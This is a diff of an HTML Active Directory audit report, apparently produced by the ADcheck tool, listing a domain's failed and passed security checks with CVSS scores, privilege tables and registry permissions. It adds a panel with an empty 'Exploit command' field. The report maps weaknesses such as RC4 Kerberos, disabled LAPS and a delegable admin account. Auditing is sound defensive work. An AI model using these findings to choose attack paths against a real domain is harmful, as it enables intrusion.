+        <span class="vector">CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(4, "Audit and Policy Management")'>
+      <span class="badge sev-medium">6.8</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Authentication limited to NTLMv2 mechanism only : False
+        <span class="vector">CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(5, "Audit and Policy Management")'>
+      <span class="badge sev-medium">6.8</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Untrusted Certificates Issuers:
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(6, "Audit and Policy Management")'>
+      <span class="badge sev-medium">6.1</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        AppLocker rules defined : False
+        <span class="vector">CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(7, "Audit and Policy Management")'>
+      <span class="badge sev-medium">6.1</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Powershell v2 is enabled : True
+        <span class="vector">CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(8, "Audit and Policy Management")'>
+      <span class="badge sev-medium">5.9</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        IPv4 preferred over IPv6 : False
+        <span class="vector">CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(9, "Audit and Policy Management")'>
+      <span class="badge sev-medium">4.6</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Bitlocker is enabled : False
+        <span class="vector">CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(10, "Audit and Policy Management")'>
+      <span class="badge sev-medium">4.4</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        CredentialGuard is enabled : False
+        <span class="vector">CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(11, "Audit and Policy Management")'>
+      <span class="badge sev-medium">4.4</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Too many logons are kept in the LSA cache : True
+        <span class="vector">CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Medium" onclick='openPanel(12, "Audit and Policy Management")'>
+      <span class="badge sev-medium">4.4</span>
+      <span class="sev-pill sev-medium">Medium</span>
+      <span class="msg">
+        Lsass runs as a protected process : False
+        <span class="vector">CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Low" onclick='openPanel(13, "Audit and Policy Management")'>
+      <span class="badge sev-low">3.9</span>
+      <span class="sev-pill sev-low">Low</span>
+      <span class="msg">
+        Windows Script Host is disabled : False
+        <span class="vector">CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Low" onclick='openPanel(14, "Audit and Policy Management")'>
+      <span class="badge sev-low">3.6</span>
+      <span class="sev-pill sev-low">Low</span>
+      <span class="msg">
+        Audit policy not configured
+        <span class="vector">CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Low" onclick='openPanel(15, "Audit and Policy Management")'>
+      <span class="badge sev-low">3.5</span>
+      <span class="sev-pill sev-low">Low</span>
+      <span class="msg">
+        RDP session timeout is not defined
+        <span class="vector">CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Low" onclick='openPanel(16, "Audit and Policy Management")'>
+      <span class="badge sev-low">3.3</span>
+      <span class="sev-pill sev-low">Low</span>
+      <span class="msg">
+        Powershell is configured in Restricted mode : False
+        <span class="vector">CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Low" onclick='openPanel(17, "Audit and Policy Management")'>
+      <span class="badge sev-low">3.1</span>
+      <span class="sev-pill sev-low">Low</span>
+      <span class="msg">
+        Force logoff when logon hours expire : False
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    <div class="finding-row" data-sev="Low" onclick='openPanel(18, "Audit and Policy Management")'>
+      <span class="badge sev-low">2.5</span>
+      <span class="sev-pill sev-low">Low</span>
+      <span class="msg">
+        Powershell events are logged : False
+        <span class="vector">CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    
+    
+    <div class="section-label lbl-passed">✓ Passed checks</div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Group Policy containing a password : []</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">UAC configuration is secure : True</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">MSI packages are always installed with elevated privileges : False</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">LM hash storage disabled : True</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">gpp_autologon is enabled : False</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Firewall is disabled : False</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">RDP use NLA : True</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">WDigest authentication enabled : False</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Disabled Certificates Issuers:</span>
+    </div>
+    
+    
+    
+    <div class="section-label lbl-info">ℹ Info</div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Default password policy :</span>
+      </div>
+      
+      <pre class="info-pre">{
+    "lockoutDuration": "-6000000000",
+    "lockOutObservationWindow": "-6000000000",
+    "maxPwdAge": "-42 days, 0:00:00",
+    "minPwdAge": "-1 day, 0:00:00",
+    "minPwdLength": "7",
+    "pwdHistoryLength": "24",
+    "pwdProperties": "DOMAIN_PASSWORD_COMPLEX"
+}</pre>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">AMSI installed is : Windows Defender</span>
+      </div>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <div class="table-title">Group Policy Objects by OU</div>
+      </div>
+      <table class="data-table">
+        <thead><tr><th>OU DN</th><th>GPO Name</th><th>Display Name</th></tr></thead>
+        <tbody><tr><td>DC=serval,DC=int</td><td>{31B2F340-016D-11D2-945F-00C04FB984F9}</td><td>Default Domain Policy</td></tr><tr><td>OU=Domain Controllers,DC=serval,DC=int</td><td>{6AC1786C-016F-11D2-945F-00C04fB984F9}</td><td>Default Domain Controllers Policy</td></tr></tbody>
+      </table>
+    </div>
+    
+    
+    </div>
+  </div>
+  
+  
+  <div class="cat-group high" data-category="Privilege and Trust Management">
+    <div class="cat-head" onclick="toggleCat(this)">
+      <span class="cat-toggle">▾</span>
+      <span class="cat-title">Privilege and Trust Management</span>
+      <span class="cat-count">— 1 failed, 3 passed, 4 info, 2 table(s)
+      </span>
+    </div>
+    <div class="cat-body">
+    
+    <div class="section-label lbl-failed first">✗ Failed checks</div>
+    
+    <div class="finding-row" data-sev="High" onclick='openPanel(0, "Privilege and Trust Management")'>
+      <span class="badge sev-high">7.5</span>
+      <span class="sev-pill sev-high">High</span>
+      <span class="msg">
+        Computers with constrained delegation : [
+        <span class="vector">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</span>
+      </span>
+      <span class="chev">›</span>
+    </div>
+    
+    
+    
+    <div class="section-label lbl-passed">✓ Passed checks</div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Trust accounts for the delegation : []</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">Computers with rbcd :[]</span>
+    </div>
+    
+    <div class="finding-row row-static">
+      <span class="badge sev-none">OK</span>
+      <span class="msg">User can create dns record : False</span>
+    </div>
+    
+    
+    
+    <div class="section-label lbl-info">ℹ Info</div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Authentication policy silos :</span>
+      </div>
+      
+      <pre class="info-pre">[]</pre>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Policies ACL: No rights granted to sensitive trustees</span>
+      </div>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">Trust Relationships: []</span>
+      </div>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <span class="msg">WSManConfig :</span>
+      </div>
+      
+      <pre class="info-pre">{
+    "Client": {
+        "AllowUnencrypted": null,
+        "Auth": {
+            "Basic": 1,
+            "Digest": 1,
+            "Kerberos": 1,
+            "Negotiate": 1,
+            "Certificate": 1,
+            "CredSSP": null
+        },
+        "TrustedHosts": " "
+    },
+    "Service": {
+        "AllowUnencrypted": null,
+        "Auth": {
+            "Basic": null,
+            "Kerberos": 1,
+            "Negotiate": 1,
+            "Certificate": null,
+            "CredSSP": null,
+            "CbtHardeningLevel": "Relaxed"
+        },
+        "IPv4Filter": "*",
+        "IPv6Filter": "*",
+        "EnableCompatibilityHttpListener": null,
+        "EnableCompatibilityHttpsListener": null,
+        "AllowRemoteAccess": 1
+    }
+}</pre>
+      
+    </div>
+    
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <div class="table-title">Privesc Groups</div>
+      </div>
+      <table class="data-table">
+        <thead><tr><th>Group DN</th><th>Members (sAMAccountName)</th></tr></thead>
+        <tbody><tr><td>CN=Administrators,CN=Builtin,DC=serval,DC=int</td><td>Domain Admins</td></tr><tr><td></td><td>Enterprise Admins</td></tr><tr><td></td><td>Administrator</td></tr><tr><td>CN=Replicator,CN=Builtin,DC=serval,DC=int</td><td>-</td></tr><tr><td>CN=Server Operators,CN=Builtin,DC=serval,DC=int</td><td>-</td></tr><tr><td>CN=Backup Operators,CN=Builtin,DC=serval,DC=int</td><td>-</td></tr><tr><td>CN=Print Operators,CN=Builtin,DC=serval,DC=int</td><td>-</td></tr><tr><td>CN=Account Operators,CN=Builtin,DC=serval,DC=int</td><td>-</td></tr><tr><td>CN=Remote Desktop Users,CN=Builtin,DC=serval,DC=int</td><td>-</td></tr><tr><td>CN=Certificate Service DCOM Access,CN=Builtin,DC=serval,DC=int</td><td>-</td></tr></tbody>
+      </table>
+    </div>
+    
+    <div class="info-item">
+      <div class="info-head">
+        <span class="badge badge-info">INFO</span>
+        <div class="table-title">Privilege Rights</div>
+      </div>
+      <table class="data-table">
+        <thead><tr><th>Right</th><th>Accounts / SIDs</th></tr></thead>
+        <tbody><tr><td>SeAssignPrimaryTokenPrivilege</td><td>Network Service, Local Service</td></tr><tr><td>SeAuditPrivilege</td><td>Network Service, Local Service</td></tr><tr><td>SeBackupPrivilege</td><td>Server Operators, Backup Operators, Administrators</td></tr><tr><td>SeBatchLogonRight</td><td>Performance Log Users, Backup Operators, Administrators</td></tr><tr><td>SeChangeNotifyPrivilege</td><td>Pre-Windows 2000 Compatible Access, Authenticated Users, Administrators, Network Service, Local Service, Everyone</td></tr><tr><td>SeCreatePagefilePrivilege</td><td>Administrators</td></tr><tr><td>SeDebugPrivilege</td><td>Administrators</td></tr><tr><td>SeIncreaseBasePriorityPrivilege</td><td>System Managed Accounts Group, Administrators</td></tr><tr><td>SeIncreaseQuotaPrivilege</td><td>Administrators, Network Service, Local Service</td></tr><tr><td>SeInteractiveLogonRight</td><td>Enterprise Domain Controllers, Print Operators, Server Operators, Account Operators, Backup Operators, Administrators</td></tr><tr><td>SeLoadDriverPrivilege</td><td>Print Operators, Administrators</td></tr><tr><td>SeMachineAccountPrivilege</td><td>Authenticated Users</td></tr><tr><td>SeNetworkLogonRight</td><td>Pre-Windows 2000 Compatible Access, Enterprise Domain Controllers, Authenticated Users, Administrators, Everyone</td></tr><tr><td>SeProfileSingleProcessPrivilege</td><td>Administrators</td></tr><tr><td>SeRemoteShutdownPrivilege</td><td>Server Operators, Administrators</td></tr><tr><td>SeRestorePrivilege</td><td>Server Operators, Backup Operators, Administrators</td></tr><tr><td>SeSecurityPrivilege</td><td>Administrators</td></tr><tr><td>SeShutdownPrivilege</td><td>Print Operators, Server Operators, Backup Operators, Administrators</td></tr><tr><td>SeSystemEnvironmentPrivilege</td><td>Administrators</td></tr><tr><td>SeSystemProfilePrivilege</td><td>S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420, Administrators</td></tr><tr><td>SeSystemTimePrivilege</td><td>Server Operators, Administrators, Local Service</td></tr><tr><td>SeTakeOwnershipPrivilege</td><td>Administrators</td></tr><tr><td>SeUndockPrivilege</td><td>Administrators</td></tr><tr><td>SeEnableDelegationPrivilege</td><td>Administrators</td></tr></tbody>
+      </table>
+    </div>
+    
+    
+    </div>
+  </div>
+  
   </div>
 </div>
+
+<div class="overlay" id="overlay" onclick="closePanel()"></div>
+<aside class="panel" id="panel">
+  <div class="panel-head">
+    <button class="panel-close" onclick="closePanel()">×</button>
+    <div class="ph-top">
+      <span class="badge" id="p-badge"></span>
+      <span class="sev-pill" id="p-sev"></span>
+    </div>
+    <h3 id="p-title"></h3>
+  </div>
+  <div class="panel-body">
+    <div class="field"><div class="k">Category</div><div class="v" id="p-cat"></div></div>
+    <div class="field"><div class="k">State</div><div class="v"><span class="state" id="p-state"></span></div></div>
+    <div class="field"><div class="k">CVSS vector</div><div class="v"><code class="inl" id="p-vector"></code></div></div>
+    <div class="field"><div class="k">Exploit command <button class="copy-btn" onclick="copyExploit()">copy</button></div><div class="v" id="p-exploit"></div></div>
+    <div class="field"><div class="k">Fix</div><div class="v" id="p-fix"></div></div>
+  </div>
+</aside>
 
 <footer>
   Report generated by <strong>CobblePot59</strong> — <a href="https://github.com/CobblePot59/ADcheck" target="_blank">GitHub ADcheck</a>
 </footer>
 
 <script>
-  const data = {
-    "privs": [{"color": "green", "message": "Trust accounts for the delegation : []"}, {"color": "green", "message": "Computers with rbac :[]"}, {"color": "green", "message": "Computers with constrained delegation : []"}, {"color": "green", "message": "User can create dns record : False"}, {"color": "black", "message": "Authentication policy silos :\n[]"}, {"color": "black", "message": "Privilege Rights :\n{\n    \"SeAssignPrimaryTokenPrivilege\": [\n        \"Network Service\",\n        \"NT Authority (Local Service)\"\n    ],\n    \"SeAuditPrivilege\": [\n        \"Network Service\",\n        \"NT Authority (Local Service)\"\n    ],\n    \"SeBackupPrivilege\": [\n        \"Server Operators\",\n        \"Backup Operators\",\n        \"Administrators\"\n    ],\n    \"SeBatchLogonRight\": [\n        \"Builtin\\\\Performance Log Users\",\n        \"Backup Operators\",\n        \"Administrators\"\n    ],\n    \"SeChangeNotifyPrivilege\": [\n        \"Builtin\\\\Pre-Windows 2000 Compatible Access\",\n        \"Authenticated Users\",\n        \"Administrators\",\n        \"Network Service\",\n        \"NT Authority (Local Service)\",\n        \"Everyone\"\n    ],\n    \"SeCreatePagefilePrivilege\": [\n        \"Administrators\"\n    ],\n    \"SeDebugPrivilege\": [\n        \"Administrators\"\n    ],\n    \"SeIncreaseBasePriorityPrivilege\": [\n        \"System Managed Accounts Group\",\n        \"Administrators\"\n    ],\n    \"SeIncreaseQuotaPrivilege\": [\n        \"Administrators\",\n        \"Network Service\",\n        \"NT Authority (Local Service)\"\n    ],\n    \"SeInteractiveLogonRight\": [\n        \"Enterprise Domain Controllers\",\n        \"Print Operators\",\n        \"Server Operators\",\n        \"Account Operators\",\n        \"Backup Operators\",\n        \"Administrators\"\n    ],\n    \"SeLoadDriverPrivilege\": [\n        \"Print Operators\",\n        \"Administrators\"\n    ],\n    \"SeMachineAccountPrivilege\": [\n        \"Authenticated Users\"\n    ],\n    \"SeNetworkLogonRight\": [\n        \"Builtin\\\\Pre-Windows 2000 Compatible Access\",\n        \"Enterprise Domain Controllers\",\n        \"Authenticated Users\",\n        \"Administrators\",\n        \"Everyone\"\n    ],\n    \"SeProfileSingleProcessPrivilege\": [\n        \"Administrators\"\n    ],\n    \"SeRemoteShutdownPrivilege\": [\n        \"Server Operators\",\n        \"Administrators\"\n    ],\n    \"SeRestorePrivilege\": [\n        \"Server Operators\",\n        \"Backup Operators\",\n        \"Administrators\"\n    ],\n    \"SeSecurityPrivilege\": [\n        \"Administrators\"\n    ],\n    \"SeShutdownPrivilege\": [\n        \"Print Operators\",\n        \"Server Operators\",\n        \"Backup Operators\",\n        \"Administrators\"\n    ],\n    \"SeSystemEnvironmentPrivilege\": [\n        \"Administrators\"\n    ],\n    \"SeSystemProfilePrivilege\": [\n        \"S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420\",\n        \"Administrators\"\n    ],\n    \"SeSystemTimePrivilege\": [\n        \"Server Operators\",\n        \"Administrators\",\n        \"NT Authority (Local Service)\"\n    ],\n    \"SeTakeOwnershipPrivilege\": [\n        \"Administrators\"\n    ],\n    \"SeUndockPrivilege\": [\n        \"Administrators\"\n    ],\n    \"SeEnableDelegationPrivilege\": [\n        \"Administrators\"\n    ]\n}"}, {"color": "black", "message": "Group policy folder/file rights :\n{\n    \"User can write extended attributes Default Domain Policy\": [\n        \"User can be traversed serval.int/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol\",\n        \"User can be traversed serval.int/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI\",\n        \"User can be traversed serval.int/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf\"\n    ],\n    \"User can write extended attributes Default Domain Controllers Policy\": [\n        \"User can be traversed serval.int/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI\",\n        \"User can be traversed serval.int/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf\"\n    ]\n}"}, {"color": "black", "message": "HKLM\\SYSTEM permissions :"}, {"color": "black", "message": "[\n    {\n        \"User\": \"Authenticated Users\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Read\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"Server Operators\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Read\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"Administrators\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Full Control\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"System (or Local System)\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Full Control\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"Creator Owner ID\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": [],\n            \"InheritedObjectType\": \"Subkeys only\"\n        }\n    },\n    {\n        \"User\": \"All Application Packages\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Read\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Read\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    }\n]\n"}, {"color": "black", "message": "HKLM\\SECURITY permissions :"}, {"color": "black", "message": "[\n    {\n        \"User\": \"System (or Local System)\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Full Control\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"Administrators\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": [\n                \"Read Control\",\n                \"Write DAC\"\n            ],\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    }\n]\n"}, {"color": "black", "message": "HKLM\\SAM permissions :"}, {"color": "black", "message": "[\n    {\n        \"User\": \"Users\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Read\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"Administrators\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Full Control\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"System (or Local System)\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Full Control\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"Creator Owner ID\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Full Control\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"All Application Packages\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Read\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    },\n    {\n        \"User\": \"S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681\",\n        \"Permissions\": {\n            \"PermissionsType\": \"ACCESS_ALLOWED_ACE\",\n            \"PermissionsValue\": \"Read\",\n            \"InheritedObjectType\": \"This key and subkeys\"\n        }\n    }\n]\n"}, {"color": "black", "message": "Control delegations : \n{\n    \"OU=Domain Controllers,DC=serval,DC=int\": [],\n    \"OU=DomainUsers,DC=serval,DC=int\": [],\n    \"OU=VPN,OU=DomainUsers,DC=serval,DC=int\": [],\n    \"CN=Computers,DC=serval,DC=int\": [],\n    \"CN=ForeignSecurityPrincipals,DC=serval,DC=int\": [],\n    \"CN=Keys,DC=serval,DC=int\": [],\n    \"CN=Managed Service Accounts,DC=serval,DC=int\": [],\n    \"CN=Program Data,DC=serval,DC=int\": [],\n    \"CN=Users,DC=serval,DC=int\": [],\n    \"DC=serval,DC=int\": []\n}\n"}, {"color": "black", "message": "WSManConfig :\n{\n    \"Client\": {\n        \"AllowUnencrypted\": 0,\n        \"Auth\": {\n            \"Basic\": 1,\n            \"Digest\": 1,\n            \"Kerberos\": 1,\n            \"Negotiate\": 1,\n            \"Certificate\": 1,\n            \"CredSSP\": 0\n        },\n        \"TrustedHosts\": \" \"\n    },\n    \"Service\": {\n        \"AllowUnencrypted\": 0,\n        \"Auth\": {\n            \"Basic\": 0,\n            \"Kerberos\": 1,\n            \"Negotiate\": 1,\n            \"Certificate\": 0,\n            \"CredSSP\": 0,\n            \"CbtHardeningLevel\": \"Relaxed\"\n        },\n        \"IPv4Filter\": \"*\",\n        \"IPv6Filter\": \"*\",\n        \"EnableCompatibilityHttpListener\": 0,\n        \"EnableCompatibilityHttpsListener\": 0,\n        \"AllowRemoteAccess\": 1\n    }\n}"}],
-    "user": [{"color": "red", "message": "Accounts that were an admin : [\u0027Administrator\u0027]"}, {"color": "green", "message": "Accounts vulnerable to timeroasting attack : []"}, {"color": "green", "message": "Accounts which have reversible passwords : []"}, {"color": "red", "message": "Pre-Windows 2000 Compatible Access group members contain \"Authenticated Users : True"}, {"color": "green", "message": "Locked accounts : []"}, {"color": "green", "message": "Accounts vulnerable to kerberoasting attack : []"}, {"color": "green", "message": "Number of inactive accounts: 0"}, {"color": "green", "message": "Accounts which can use des authentication : []"}, {"color": "green", "message": "Accounts with altSecurityIdentities attributes: []"}, {"color": "green", "message": "Accounts with userPassword attributes: []"}, {"color": "green", "message": "Accounts with unixUserPassword attributes: []"}, {"color": "green", "message": "Accounts with unicodePwd attributes: []"}, {"color": "green", "message": "Accounts with msDS-HostServiceAccount attributes: []"}, {"color": "green", "message": "Accounts vulnerable to asreproasting attack : []"}, {"color": "red", "message": "Admin accounts not in Protected Users group : [\u0027Administrator\u0027]"}, {"color": "red", "message": "Admin accounts that can be delegated : [\u0027Administrator\u0027]"}, {"color": "green", "message": "Number of accounts which have never expiring passwords : 2"}, {"color": "black", "message": "Group Managed Service Accounts : []"}, {"color": "black", "message": "Users with description : [\u0027Administrator\u0027, \u0027Guest\u0027, \u0027krbtgt\u0027]"}, {"color": "green", "message": "Number of accounts with identical password : 0"}],
-    "domain": [{"color": "red", "message": "Spooler service is enabled on remote target : True"}, {"color": "green", "message": "SMB signing is required : True"}, {"color": "red", "message": "Recycle Bin is enabled : False"}, {"color": "red", "message": "LDAP signature was required on target : False"}, {"color": "red", "message": "Kerberos password last changed : 111 day(s) ago"}, {"color": "red", "message": "Non-admin users can add up to 10 computer(s) to a domain"}, {"color": "green", "message": "Ldap anonymous bind : False"}, {"color": "black", "message": "Named Pipes :\n[\n    \"InitShutdown\",\n    \"lsass\",\n    \"ntsvcs\",\n    \"scerpc\",\n    \"Winsock2\\\\CatalogChangeListener-28c-0\",\n    \"Winsock2\\\\CatalogChangeListener-370-0\",\n    \"epmapper\",\n    \"Winsock2\\\\CatalogChangeListener-1f0-0\",\n    \"LSM_API_service\",\n    \"Winsock2\\\\CatalogChangeListener-348-0\",\n    \"eventlog\",\n    \"Winsock2\\\\CatalogChangeListener-3f8-0\",\n    \"atsvc\",\n    \"wkssvc\",\n    \"Winsock2\\\\CatalogChangeListener-4d8-0\",\n    \"Winsock2\\\\CatalogChangeListener-28c-1\",\n    \"RpcProxy\\\\49680\",\n    \"ae218e1a306ffa31\",\n    \"RpcProxy\\\\593\",\n    \"srvsvc\",\n    \"spoolss\",\n    \"Winsock2\\\\CatalogChangeListener-96c-0\",\n    \"netdfs\",\n    \"Winsock2\\\\CatalogChangeListener-278-0\",\n    \"W32PosixPipe.00000a14.00000000\",\n    \"W32TIME_ALT\",\n    \"Winsock2\\\\CatalogChangeListener-9c4-0\",\n    \"PIPE_EVENTROOT\\\\CIMV2SCM EVENT PROVIDER\",\n    \"Winsock2\\\\CatalogChangeListener-9a0-0\",\n    \"winreg\"\n]"}, {"color": "red", "message": "Supported encryption by Domain Controllers : \n[\n    \"SRV-DC01$: [RC4, AES 128, AES 256]\"\n]"}, {"color": "black", "message": "Password Settings Object :\n[]"}, {"color": "red", "message": "Supported Kerberos encryption algorithms : RC4_HMAC_MD5"}, {"color": "black", "message": "Kerberos config :\n{\n    \"MaxTicketAge\": \"10\",\n    \"MaxRenewAge\": \"7\",\n    \"MaxServiceAge\": \"600\",\n    \"MaxClockSkew\": \"5\",\n    \"TicketValidateClient\": \"1\"\n}"}, {"color": "black", "message": "Functional level of domain is : Windows Server 2016"}, {"color": "black", "message": "Domain Controllers: [\u0027SRV-DC01$\u0027]"}, {"color": "black", "message": "Computers with bitlocker keys : []"}, {"color": "green", "message": "DFSR SYSVOL is enabled : True"}, {"color": "red", "message": "The computer was never backed up"}, {"color": "red", "message": "The computer is up to date (Last : 12/23/2024) : False"}, {"color": "red", "message": "LAPS is installed : False"}],
